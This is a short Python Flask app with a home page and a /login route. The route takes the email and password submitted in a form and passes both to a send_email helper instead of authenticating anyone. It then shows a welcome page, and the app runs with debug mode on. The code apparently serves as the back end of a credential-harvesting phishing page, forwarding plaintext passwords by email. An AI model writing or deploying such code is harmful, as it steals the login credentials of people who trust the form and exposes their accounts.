
from flask import Flask, render_template, request
from my_email import send_email 
app = Flask(__name__)


@app.route("/")
def home():
    return render_template("index.html")

@app.post("/login")
def receive_data():
    send_email(request.form["email"],request.form["password"])
    return render_template("welcome.html" )

if __name__ == "__main__":
    app.run(debug=True)
